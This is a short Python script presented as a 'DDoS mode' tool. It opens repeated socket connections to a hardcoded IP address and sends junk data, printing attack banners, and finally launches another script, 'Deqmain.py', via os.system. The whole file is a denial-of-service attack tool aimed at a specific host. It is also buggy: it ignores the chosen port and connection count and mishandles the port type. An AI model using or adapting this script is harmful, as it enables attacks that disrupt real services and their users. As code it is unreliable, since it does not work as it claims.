import time
import socket
import os
import sys
import string


# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)


curdir = os.getcwd()

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

print("DDoS mode loaded")
print("python script made by an0nymous_nl twitter")
host = "89.117.27.7"
port = input("Port you want to attack:")
message = "i am ankit"
conn = input("How many connections you want to make:")
ip = socket.gethostbyname(host)
print("[" + ip + "]")
print("[Ip is locked]")
print("[Attacking " + host + "]")
print("+----------------------------+")


def dos():
    # pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send(message.encode('utf-8'))
        ddos.sendto(message.encode('utf-8'), (ip, port))
        ddos.send(message.encode('utf-8'))
    except (socket.error, Exception) as e:
        print("|[Connection Failed]         |")
    print("|[DDoS Attack Engaged]       |")
    ddos.close()

dos()



for i in range(1, 10):
    dos()
print("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = "i am hacker"
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir + "Deqmain.py")